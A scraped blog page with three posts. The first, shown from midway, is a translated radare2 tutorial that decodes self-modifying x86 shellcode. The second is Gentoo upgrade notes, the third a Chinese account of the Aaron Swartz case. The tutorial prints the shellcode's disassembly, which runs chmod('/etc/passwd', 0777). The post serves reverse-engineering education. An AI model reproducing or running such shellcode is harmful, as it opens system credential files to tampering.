<span class="number">0x0804a040</span>              eb11  <span class="keyword">jmp</span> <span class="number">0x804a053</span>
<span class="number">0x0804a042</span>                5e  <span class="keyword">pop</span> <span class="literal">esi</span>
<span class="number">0x0804a043</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a045</span>              b127  <span class="keyword">mov</span> <span class="literal">cl</span>, <span class="number">0x27</span>
<span class="number">0x0804a047</span>        806c0eff35  <span class="keyword">sub</span> <span class="preprocessor">byte</span> [<span class="literal">esi</span>+<span class="literal">ecx</span>-<span class="number">0x1</span>], <span class="number">0x35</span>
<span class="number">0x0804a04c</span>            80e901  <span class="keyword">sub</span> <span class="literal">cl</span>, <span class="number">0x1</span>
<span class="number">0x0804a04f</span>              75f6  <span class="keyword">jne</span> <span class="number">0x804a047</span>
<span class="number">0x0804a051</span>              eb05  <span class="keyword">jmp</span> <span class="number">0x804a058</span>
<span class="number">0x0804a053</span>        e8eaffffff  <span class="keyword">call</span> <span class="number">0x804a042</span>
<span class="number">0x0804a058</span>            204a66  <span class="keyword">and</span> [<span class="literal">edx</span>+<span class="number">0x66</span>], <span class="literal">cl</span>
<span class="number">0x0804a05b</span>                f5  <span class="keyword">cmc</span>
<span class="number">0x0804a05c</span>              e544  <span class="keyword">in</span> <span class="literal">eax</span>, <span class="number">0x44</span>
<span class="number">0x0804a05e</span>                <span class="number">90</span>  <span class="keyword">nop</span>
<span class="number">0x0804a05f</span>                <span class="number">66</span>  invalid
<span class="number">0x0804a062</span>                ee  <span class="keyword">out</span> <span class="literal">dx</span>, <span class="literal">al</span>
<span class="number">0x0804a063</span>              <span class="number">3436</span>  <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x36</span>
<span class="number">0x0804a065</span>      02b566f5e536  <span class="keyword">add</span> <span class="number">dh</span>, [<span class="literal">ebp</span>+<span class="number">0x36e5f566</span>]
<span class="number">0x0804a06b</span>            <span class="number">661002</span>  o16 <span class="keyword">adc</span> [<span class="literal">edx</span>], <span class="literal">al</span>
<span class="number">0x0804a06e</span>              b51d  <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0x1d</span>
<span class="number">0x0804a070</span>            1b3434  <span class="keyword">sbb</span> <span class="literal">esi</span>, [<span class="literal">esp</span>+<span class="literal">esi</span>]
<span class="number">0x0804a073</span>              <span class="number">3464</span>  <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x64</span>
<span class="number">0x0804a075</span>    9aa99864a596a8  <span class="keyword">call</span> <span class="preprocessor">dword</span> <span class="number">0xa896</span>:<span class="number">0xa56498a9</span>
<span class="number">0x0804a07c</span>              a8ac  <span class="keyword">test</span> <span class="literal">al</span>, <span class="number">0xac</span>
<span class="number">0x0804a07e</span>                <span class="number">99</span>  <span class="keyword">cdq</span>
<span class="number">0x0804a07f</span>            <span class="number">004743</span>  <span class="keyword">add</span> [<span class="literal">edi</span>+<span class="number">0x43</span>], <span class="literal">al</span>
<span class="number">0x0804a082</span>                <span class="number">43</span>  <span class="keyword">inc</span> <span class="literal">ebx</span>
<span class="number">0x0804a083</span>              3a20  <span class="keyword">cmp</span> <span class="number">ah</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a085</span>            <span class="number">284765</span>  <span class="keyword">sub</span> [<span class="literal">edi</span>+<span class="number">0x65</span>], <span class="literal">al</span>
<span class="number">0x0804a088</span>                6e  <span class="keyword">outsb</span>
<span class="number">0x0804a089</span>              746f  <span class="keyword">je</span> <span class="number">0x804a0fa</span>
<span class="number">0x0804a08b</span>                6f  <span class="keyword">outsd</span>
<span class="number">0x0804a08c</span>            20342e  <span class="keyword">and</span> [<span class="literal">esi</span>+<span class="literal">ebp</span>], <span class="number">dh</span>
<span class="number">0x0804a08f</span>                <span class="number">37</span>  <span class="keyword">aaa</span>
<span class="number">0x0804a090</span>    2e332d72312070  <span class="keyword">xor</span> <span class="literal">ebp</span>, [<span class="literal">cs</span>:<span class="number">0x70203172</span>]
<span class="number">0x0804a097</span>              312e  <span class="keyword">xor</span> [<span class="literal">esi</span>], <span class="literal">ebp</span>
<span class="number">0x0804a099</span>            332c20  <span class="keyword">xor</span> <span class="literal">ebp</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a09c</span>              <span class="number">7069</span>  <span class="keyword">jo</span> <span class="number">0x804a107</span>
<span class="number">0x0804a09e</span>      652d302e352e  <span class="keyword">sub</span> <span class="literal">eax</span>, <span class="number">0x2e352e30</span>
<span class="number">0x0804a0a4</span>        352920342e  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="number">0x2e342029</span>
<span class="number">0x0804a0a9</span>                <span class="number">37</span>  <span class="keyword">aaa</span>
<span class="number">0x0804a0aa</span>            2e3300  <span class="keyword">xor</span> <span class="literal">eax</span>, [<span class="literal">cs</span>:<span class="literal">eax</span>]
<span class="number">0x0804a0ad</span>              1c00  <span class="keyword">sbb</span> <span class="literal">al</span>, <span class="number">0x0</span>
<span class="number">0x0804a0af</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b1</span>              <span class="number">0200</span>  <span class="keyword">add</span> <span class="literal">al</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0b3</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b5</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0b7</span>              <span class="number">0400</span>  <span class="keyword">add</span> <span class="literal">al</span>, <span class="number">0x0</span>
<span class="number">0x0804a0b9</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0bb</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0bd</span>                9c  <span class="keyword">pushfd</span>
<span class="number">0x0804a0be</span>            <span class="number">840408</span>  <span class="keyword">test</span> [<span class="literal">eax</span>+<span class="literal">ecx</span>], <span class="literal">al</span>
<span class="number">0x0804a0c1</span>              3a00  <span class="keyword">cmp</span> <span class="literal">al</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0c3</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c5</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c7</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0c9</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0cb</span>              <span class="number">0000</span>  <span class="keyword">add</span> [<span class="literal">eax</span>], <span class="literal">al</span>
<span class="number">0x0804a0cd</span>                1e  <span class="keyword">push</span> <span class="literal">ds</span>
<span class="number">0x0804a0ce</span>              <span class="number">0300</span>  <span class="keyword">add</span> <span class="literal">eax</span>, [<span class="literal">eax</span>]
<span class="number">0x0804a0d0</span>              <span class="number">0002</span>  <span class="keyword">add</span> [<span class="literal">edx</span>], <span class="literal">al</span>
</code></pre><p>现在开始在心中模拟执行。首先跳到<code>0x804a053</code>，在那里调用<code>0x804a042</code>，就是第一个指令后面的一个指令。</p>
<p>看上去啥也没干似的。但是，<code>call</code>调用将调用的返回地址推入栈中，接着存入<code>esi</code>中。在32位x86中没法直接获取<code>eip</code>，刚才那个过程就是著名的获取eip的一种hack。程序计数器(<code>eip</code>)可以用来指向有效载荷相关的数据/代码(记住：攻击者不知道他的代码将被连接器分配到何处)。</p>
<p>现在执行到<code>0x0804a043</code>，<code>esi</code>中的值是<code>0x0804a058</code>。这个异或指令在把<code>0x27</code>载入<code>ecx</code>前将其置零。</p>
<p><code>0x0804a047</code>开始将<code>[esi+ecx-0x1]</code>地址的内容减<code>0x35</code><br><code>0x3c00104c</code>将<code>ecx</code>减1<br><code>0x3c00104f</code>如果<code>ecx</code>不为零循环到<code>0x0804a047</code></p>
<p><code>ecx</code>是<code>{0x27, 0x26,...,0x1}</code>，<code>esi</code>已知。所以通过计算，需要将从<code>0x0804a058</code>开始的<code>0x27</code>字节减去<code>0x35</code>。为了模拟这个自修改代码的效果。可以使用<code>wo</code>系列命令。查看相关帮助：</p>
<pre><code>[0x080483a0]&gt; wo?
|<span class="string">Usage: wo[asmdxoArl24] [hexpairs] @ addr[:bsize]
</span>|<span class="string">Example:
</span>|<span class="string">  wox 0x90   ; xor cur block with 0x90
</span>|<span class="string">  wox 90     ; xor cur block with 0x90
</span>|<span class="string">  wox 0x0203 ; xor cur block with 0203
</span>|<span class="string">  woa 02 03  ; add [0203][0203][...] to curblk
</span>|<span class="string">  woe 02 03  
</span>|<span class="string">Supported operations:
</span>|<span class="string">  wow  ==  write looped value (alias for 'wb')
</span>|<span class="string">  woa  +=  addition
</span>|<span class="string">  wos  -=  substraction
</span>|<span class="string">  wom  *=  multiply
</span>|<span class="string">  wod  /=  divide
</span>|<span class="string">  wox  ^=  xor
</span>|<span class="string">  woo  </span>|<span class="string">=  or
</span>|<span class="string">  woA  &amp;=  and
</span>|<span class="string">  woR  random bytes (alias for 'wr $b'
</span>|<span class="string">  wor  &gt;&gt;= shift right
</span>|<span class="string">  wol  &lt;&lt;= shift left
</span>|<span class="string">  wo2  2=  2 byte endian swap
</span>|<span class="string">  wo4  4=  4 byte endian swap</span>
</code></pre><p>使用<code>wos</code>从一段内存地址中减去一个常量。但首先要打开输入输出缓存(io cache)。默认情况下radare2以只读方式打开文件，除非以<code>-w</code>标志打开。或者，设置<code>io.cache</code>为<code>true</code>，在内润中缓存写入内容。用户可随意撤销或者提交这些写入，暂不用讨论这些细节。</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; e io.cache=true
[<span class="number">0x080483a0</span>]&gt; wos <span class="number">0x35</span>@<span class="number">0x0804a058</span>:<span class="number">0x27</span>
[<span class="number">0x080483a0</span>]&gt; pDi <span class="number">30</span>@sym.shellcode 
<span class="number">0x0804a040</span>              eb11  <span class="keyword">jmp</span> <span class="number">0x804a053</span>
<span class="number">0x0804a042</span>                5e  <span class="keyword">pop</span> <span class="literal">esi</span>
<span class="number">0x0804a043</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a045</span>              b127  <span class="keyword">mov</span> <span class="literal">cl</span>, <span class="number">0x27</span>
<span class="number">0x0804a047</span>        806c0eff35  <span class="keyword">sub</span> <span class="preprocessor">byte</span> [<span class="literal">esi</span>+<span class="literal">ecx</span>-<span class="number">0x1</span>], <span class="number">0x35</span>
<span class="number">0x0804a04c</span>            80e901  <span class="keyword">sub</span> <span class="literal">cl</span>, <span class="number">0x1</span>
<span class="number">0x0804a04f</span>              75f6  <span class="keyword">jne</span> <span class="number">0x804a047</span>
<span class="number">0x0804a051</span>              eb05  <span class="keyword">jmp</span> <span class="number">0x804a058</span>
<span class="number">0x0804a053</span>        e8eaffffff  <span class="keyword">call</span> <span class="number">0x804a042</span>
<span class="number">0x0804a058</span>              eb15  <span class="keyword">jmp</span> <span class="number">0x804a06f</span>
<span class="number">0x0804a05a</span>              31c0  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">0x0804a05c</span>              b00f  <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0xf</span>
<span class="number">0x0804a05e</span>                5b  <span class="keyword">pop</span> <span class="literal">ebx</span>
<span class="number">0x0804a05f</span>              31c9  <span class="keyword">xor</span> <span class="literal">ecx</span>, <span class="literal">ecx</span>
<span class="number">0x0804a061</span>          66b9ff01  <span class="keyword">mov</span> <span class="literal">cx</span>, <span class="number">0x1ff</span>
<span class="number">0x0804a065</span>              cd80  <span class="keyword">int</span> <span class="number">0x80</span>
<span class="number">0x0804a067</span>              31c0  <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
<span class="number">0x0804a069</span>              b001  <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0x1</span>
<span class="number">0x0804a06b</span>              31<span class="pseudo">db</span>  <span class="keyword">xor</span> <span class="literal">ebx</span>, <span class="literal">ebx</span>
<span class="number">0x0804a06d</span>              cd80  <span class="keyword">int</span> <span class="number">0x80</span>
<span class="number">0x0804a06f</span>        e8e6ffffff  <span class="keyword">call</span> <span class="number">0x804a05a</span>
<span class="number">0x0804a074</span>                2f  <span class="keyword">das</span>
<span class="number">0x0804a075</span>            <span class="number">657463</span>  <span class="keyword">je</span> <span class="number">0x804a0db</span>
<span class="number">0x0804a078</span>                2f  <span class="keyword">das</span>
<span class="number">0x0804a079</span>              <span class="number">7061</span>  <span class="keyword">jo</span> <span class="number">0x804a0dc</span>
<span class="number">0x0804a07b</span>              <span class="number">7373</span>  <span class="keyword">jae</span> <span class="number">0x804a0f0</span>
<span class="number">0x0804a07d</span>              <span class="number">7764</span>  <span class="keyword">ja</span> <span class="number">0x804a0e3</span>
<span class="number">0x0804a07f</span>                cb  <span class="keyword">retf</span>
<span class="number">0x0804a080</span>              120e  <span class="keyword">adc</span> <span class="literal">cl</span>, [<span class="literal">esi</span>]
<span class="number">0x0804a082</span>                0e  <span class="keyword">push</span> <span class="literal">cs</span>
</code></pre><p>看到<code>0x0804a058</code>之后的指令开始有效。我先看到个<code>int 0x80</code>指令。在UNIX类系统中，<code>0x80</code>终端有特殊含义：要求内核执行系统调用，系统调用号储存在<code>eax</code>中。</p>
<p>通过人工执行(通过跳转和调用)，可得<code>eax</code>在<code>0x0804a065</code>是<code>0xf</code>，在<code>0x0804a06d</code>是<code>0x1</code>。然后google下或者随便参考下x86内核头文件就知道是哪些系统调用了。</p>
<p>可查得在<code>0x0804a065</code>调用<code>chmod</code>，接着在<code>0x0804a06d</code>调用<code>exit</code>。接着检查调用参数弄清这些调用做了什么。在linux系统中，调用参数在寄存器中(<code>ebx</code>,<code>ecx</code>,<code>edx</code>, <code>esi</code>, <code>edi</code>, <code>ebp</code>)。</p>
<p><code>chmod</code>有两个参数：分别在<code>ebx</code>和<code>ecx</code>中有指向文件路径的字符指针和模式(<code>mode_t</code>，只是一个指定想要更改成的模式或者权限的整数)。<code>ebx</code>在<code>0x0804a05e</code>从栈顶弹出，向回溯源看到栈上最顶的东西是<code>0x0804a06f</code>调用的返回地址(<code>0x0804a074</code>)。当然，这根本不是返回地址，就是一种巧妙的将字符串打包到有效载荷中的方式(shellcode动态寻址)。使用<code>ps</code>命令看看它是啥：</p>
<pre><code><span class="special">[</span>0x080483a0<span class="special">]</span>&gt; ps@0x0804a074
/etc/passwd<span class="command">\xcb</span><span class="command">\x</span>12<span class="command">\x</span>0e<span class="command">\x</span>0e<span class="command">\x</span>05<span class="command">\xeb</span><span class="command">\xf</span>3<span class="command">\x</span>1209?::<span class="command">\xeb</span><span class="command">\xff</span><span class="command">\xf</span>9<span class="command">\x</span>02<span class="command">\xf</span>9<span class="command">\xfe</span><span class="command">\xf</span>8=<span class="command">\xfc</span><span class="command">\xeb</span>;<span class="command">\xfc</span><span class="command">\xf</span>9<span class="command">\xfe</span><span class="command">\xf</span>7<span class="command">\xeb</span>;40<span class="command">\xf</span>8<span class="command">\xfb</span><span class="command">\xf</span>9
</code></pre><p><code>chmod</code>的第二个参数在<code>ecx</code>中。值是<code>0x1ff</code>，换算成八进制就是<code>0777</code></p>
<pre><code>(gdb) p/o <span class="number">0x1ff</span>
<span class="variable">$2</span> = <span class="number">0777</span>
</code></pre><p>所以调用就是<code>chmod(&#39;/etc/passwd&#39;, 0777)</code></p>
<p>之后仅仅是调用<code>exit</code>退出程序。</p>
<h2 id="总结评论">总结评论</h2><p>这里是一个在运行时动态改变自身来对抗静态分析的shellcode。该技术并不新奇，确是逃避硬编码检测的简单方法。</p>
<p>现代操作系统中这个shellcode不起作用，因为有效载荷在二进制文件的<code>.data</code>区，不可写也不可执行…………译者表示这扯远了不管它，通过使用gcc的参数<code>-fno-stack-protector execstack</code>等应该可以把这些保护关上，大概吧，记不清楚了。</p>
<p>如果想有点挑战性，试试精简过的(stripped)的二进制文件！</p>
<p>有评论告诉我。</p>
<hr>
<p>以下是译者的题外话：</p>
<p>Recent：</p>
<ul>
<li>coursera crypto-11</li>
<li>statistics for engineers and the sciences</li>
<li>coursera pred-003, I give up follow this course</li>
<li>Xie Yihui，现代统计图形</li>
<li>python for data analysis</li>
</ul>
<p>Next?: append</p>
<ul>
<li>Wikibooks:x86 assembly, <a href="http://en.wikibooks.org/wiki/X86_Disassembly" target="_blank" rel="external">http://en.wikibooks.org/wiki/X86_Disassembly</a></li>
<li>phrack radare: <a href="http://phrack.org/issues/66/14.html" target="_blank" rel="external">http://phrack.org/issues/66/14.html</a></li>
<li>crackme: <a href="http://dustri.org/b/defeating-ioli-with-radare2.html" target="_blank" rel="external">http://dustri.org/b/defeating-ioli-with-radare2.html</a></li>
</ul>
<p>Future:</p>
<p>The elements of statistical learning?</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2014/07/26/upgrade-gentoo-linux/" itemprop="url">
                  Upgrade Gentoo Linux
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-07-26T00:00:00+08:00" content="2014-07-26">
              2014-07-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2014/07/26/upgrade-gentoo-linux/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2014/07/26/upgrade-gentoo-linux/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>Nowadays, I upgraded my gentoo linux.</p>
<p>I have not synchronoused the portage tree for nearly half of the year. When I came with upgrading my system, I got stuck with a lot of things I’ve never thought.</p>
<p>Luckily enough, gentoo use a mechanism to incremental upgrade. So I spent days to completely upgrade the system just with the system working properly.</p>
<p>This is a simple notes. I can’t really remember the details.</p>
<p>I’ll just write down what I learned from this lesson. To more smoothly upgrade the  system the next time.</p>
<h2 id="Upgrade_The_Stable">Upgrade The Stable</h2><h3 id="Upgrade_it">Upgrade it</h3><p>First, syncing the portage tree.</p>
<pre><code>emerge-websync
</code></pre><p>Select a good source, if you encounter with something wrong just remove the portage tree in <code>/usr/portage/</code>.</p>
<p color="red">NEVER NEVER FORGET TO READ THE NEWS</p>

<pre><code>eselect <span class="keyword">news</span> <span class="keyword">list</span>
</code></pre><p>Then, emerge the world. You can edit <code>/usr/portage/world</code> to select what you really want. I’ve play a lot of things I may never explore later, so I just edit it to minimize the time for upgrading.</p>
<p>We can emerge world now. And, preparing for struggling for hours or days…Always use <code>--with-bdeps=y</code>.</p>
<pre><code><span class="comment">emerge</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">update</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">deep</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">bdeps=y</span> <span class="comment">@world</span>
</code></pre><p>As a alternative, emerge system first.</p>
<pre><code><span class="comment">emerge</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">update</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">deep</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">bdeps=y</span> <span class="comment">system</span>
</code></pre><p>Always, there exists tons of conflicts and some other problems like licenses and so on.</p>
<p>As far as I know, one have to solve them step by step.</p>
<h3 id="Problems">Problems</h3><p>There may three major problems:</p>
<h4 id="Dependency_Conflict">Dependency Conflict</h4><p>Check if you have emerge softwares are not included in the stable portage tree. Remove it like this:</p>
<pre><code>emerge <span class="comment">--depclean google-chrome</span>
</code></pre><p>Check if you’ve masked some software. Remove them…</p>
<p>Re-emerge.</p>
<h4 id="Build_or_Configure_Error">Build or Configure Error</h4><p>Just search via google. You may re-emerge something portage won’t handle properly.</p>
<p>Sometimes, this is because you have to rebuild Perl modules.</p>
<pre><code><span class="comment">perl</span><span class="literal">-</span><span class="comment">cleaner</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">all</span> <span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">exclude=perl</span><span class="literal">-</span><span class="comment">core/Module</span><span class="literal">-</span><span class="comment">CoreList</span>
</code></pre><h4 id="New_XXX_Need_to_be_Changed_to_Proceed">New XXX Need to be Changed to Proceed</h4><p>Use <code>--auto-unmask-write</code> if you know what you are doing.</p>
<p>then:</p>
<pre><code><span class="built_in">dispatch</span>-conf
</code></pre><p>or:</p>
<pre><code>etc-<span class="keyword">update</span>
</code></pre><h2 id="Post_Upgrading">Post Upgrading</h2><p>You may want to update the overlay too.</p>
<pre><code><span class="title">layman</span> -S
</code></pre><p>Yet another emerge world(If you encounter with problems, refer to the notes above):</p>
<pre><code><span class="comment">emerge</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">update</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">deep</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">with</span><span class="literal">-</span><span class="comment">bdeps=y</span> <span class="comment">@world</span>
</code></pre><p>Remove orphaned packages.</p>
<pre><code>emerge <span class="comment">--depclean -a</span>
</code></pre><p>Check obsolete packages:</p>
<pre><code>eix-test-<span class="pragma">obsolete</span>
</code></pre><p>Update configure files:</p>
<pre><code>etc-<span class="keyword">update</span>
</code></pre><p>Rebuild broken packages:</p>
<pre><code>revdep-rebuild
</code></pre><p>Update eix databases:</p>
<pre><code>eix-<span class="keyword">update</span>
</code></pre><p>If you compile a new kernel(you do not have to), don’t forget to:</p>
<pre><code><span class="title">emerge</span> <span class="variable">@module</span>-rebuild
</code></pre><p>That’s all, hope this helps.</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/law/2014/06/13//" itemprop="url">
                  亚伦·斯沃茨一案
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-06-13T00:00:00+08:00" content="2014-06-13">
              2014-06-13
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/law/" itemprop="url" rel="index">
                    <span itemprop="name">law</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/law/2014/06/13//#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="law/2014/06/13//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>Update: 看到个不错的片子，The Internet’s Own Boy: The Story Of Aaron Swartz</p>
<embed src="http://player.youku.com/player.php/sid/XNzYyMDg3MzYw/v.swf" allowfullscreen="true" quality="high" width="480" height="400" align="middle" allowscriptaccess="always" type="application/x-shockwave-flash">

<p>亚伦·斯沃茨是美国著名程序员、作家、政治活动家和互联网活动家。在其通过MIT的网络使用其拥有的哈佛研究员帐号下载大量学术论文后，被控告违反计算机欺诈和滥用法案。面对监禁，斯沃茨选择自杀。上诉随之被撤销。</p>
<h2 id="背景">背景</h2><p>2011年1月6日斯沃茨被MIT警署以其因系统下载JSTOR的学术论文涉及破坏和入侵指控逮捕。联邦检察官最终控告他两项网络诈骗和11项违反计算机欺诈和滥用法案行为。控诉累计罚款一百万美元外加35年监禁、财产没收、归还和监督保释。</p>
<p>2013年1月11日，距其被逮捕两年后，斯沃茨被发现在纽约公寓内上吊身亡。</p>
<p>JSTOR是在线数字内容提供商，提供手稿、GIS系统、扫描的植物标本和来自期刊的文章。斯沃茨是哈佛大学研究员，拥有一个JSTOR帐号。MIT开放校园访客拥有从其网络访问接入JSTOR的权利。</p>
<p>根据州和联邦政府，斯沃茨在2010年末到2011年初的几周内，通过MIT计算机网络从JSTOR下载了大量学术论文。斯沃茨通过在MIT受控接入配线间的交换机下载了大量文档到其笔记本上，而根据新闻报导，通往配线间的门是锁上的。</p>
<h2 id="逮捕、指控和起诉">逮捕、指控和起诉</h2><p>2011年1月6日，斯沃茨在哈佛校园附近被两名MIT警察和一名特勤局特工逮捕。随后在剑桥地区法院以蓄意犯下重罪破坏和入侵两项罪名提审。</p>
<p>2011年7月11日，斯沃茨在联邦地区法院被以四项重罪起诉：网络诈骗、计算机诈骗、非法从受保护计算机获取信息和不顾一切地破坏受保护计算机。</p>
<p>2011年11月17日，斯沃茨被米德尔塞克斯县高级法院大陪审团以蓄意破坏和进入、巨额盗窃和未授权接入计算机网络罪名起诉。</p>
<p>2011年12月16日，地区律师办公室发出撤回斯沃茨2011年6月被捕以来诉讼的声明。从2011年11月17日开始有关州指控的起诉于2012年3月8日取消。根据米德尔塞克斯县检察官声明州控诉取消是为了让联邦控诉顺畅进行。</p>
<p>据指此案本可以以未有任何发现毫无进展而保留判决撤回诉讼，联邦检察官的调查和介入引发了悲剧。</p>
<h2 id="联邦检察官">联邦检察官</h2><p>2011年4月13日，作为调查的一部分，联邦政府走访了斯沃茨的前伙伴连线急着奎因·诺顿。</p>
<p>2011年7月19日，7月11日起诉解封。控告斯沃茨两项欺诈和两项涉及非法介入和破坏受保护计算机罪名。根据起诉书，斯沃茨暗中将笔记本介入MIT计算机网络，运行叫做<code>keepgrabbing.py</code>的脚本，从JSTOR下载了惊人数量的文章。本案检察官说斯沃茨有将论文公开到P2P文件共享站点的意图。</p>
<p>斯沃茨向当局自首，对所有罪状供人不讳，以10万美元无抵押保释。在他被捕后，JSTOR发出声明，尽管它们认为斯沃茨的接入是以一种非授权方式的重大滥用，它们不考虑寻求对他的民事诉讼。MIT对诉讼没有评论。</p>
<p>纽约时报对案例这样描述：一个受尊敬的哈佛研究员和互联网英雄在波士顿被捕并被指控计算机黑客行为，全基于对他从有权自由获取的地方下载文章的控诉。锥子网站也类似地评论：斯沃茨被以黑客罪行指控，而不是版权侵害罪，因为其没有分发任何文档。JSTOR甚至没有想起诉他。</p>
<p>美国助理检察官斯蒂芬·海曼和斯科特·加兰德是主检察官，在美国检察官卡门·奥蒂斯的监督下工作。该案被归入计算机诈骗和滥用法案下，该法案与1986年通过以促进政府起诉非法接入计算机头去信息或破坏和摧毁计算机功能的黑客。奥蒂斯指出，如果定罪，斯沃茨将面临高达35年监禁，三年的监督保释、归还，财产没收和高达100万美元的罚款。</p>
<p>2012年9月12日，检察官提交了新的诉讼添加了九条重罪。没美国律政界普遍认为起诉过重。</p>
<h2 id="请求协商">请求协商</h2><p>斯沃茨的律师艾略特·皮特说检察官在斯沃茨死亡前两天告诉他，斯沃茨最好在监狱呆上6个月并且供认13项指控，如果他不想被审讯的话。皮特随后向司法部职业责任办公室申诉，声称如果斯沃茨不认罪，海曼威胁将寻求斯沃茨在监狱呆上七年。和皮特之前断言的联邦量刑指南中认罪部分中鼓励的相差悬殊。</p>
<p>斯沃茨最早的律师，安迪·古德告诉波士顿环球：我告诉海曼斯沃茨有自杀风险。他的反应是标准的官方反应，并不只对斯沃茨。他说，“好，我们把他关起来。”我不是说他让斯沃茨自杀，斯沃茨终将这样做。我认为它们意识到了风险但太不小心。</p>
<p>在斯沃茨死前不久，JSTOR宣称它们将免费公开4500万文章。每两周三篇文章封顶，只能在线阅读，有些可以下载。</p>
<p>在他斯沃茨死亡后，奥蒂斯办公室解除了对斯沃茨的控告。她说：引入和处理案件的官方行为是适当的，官方寻求匹配对应行为的合适量刑。一个我们推荐的最低安全环境下6个月判处。官方从来没有寻求，像斯沃茨律师所说的法律允许下的最大惩罚。</p>
<p>2013年1月12日，斯沃茨法律团队雇佣的计算机取证调查员亚历克斯·斯塔莫斯在线发表了他本该在斯沃茨审讯时提供的专家证词总结：</p>
<p>如果我如计划那样采取的立场被检察官问及亚伦的行为是“错的”，我更可能回复亚伦的行为应该被描述成欠考虑的。同样，为了历史论文检查图书馆中的每一本书也是欠考虑的，从共享Wifi下载大量文件也是欠考虑的。</p>
<h2 id="联邦控诉理由和回应">联邦控诉理由和回应</h2><p>美国检察官奥蒂斯在2011年起诉后声称：偷窃就是偷窃，无论你使用电脑命令还是撬棒，无论你偷的是文件、数据还是美元。同样损害了被害者，无论你是否出售还是赠送你偷来的东西。</p>
<h3 id="有关起诉">有关起诉</h3><p>翻译自维基百科，纪念斯沃茨。</p>
<p>被锥子网站批评：偷窃可能是偷窃，但这里什么是盗窃？很多有关该报导的推文指出了奥蒂斯评论的荒谬：“JSTOR被偷空了！”我真希望JSTOR能从它们被偷的文件中恢复。</p>
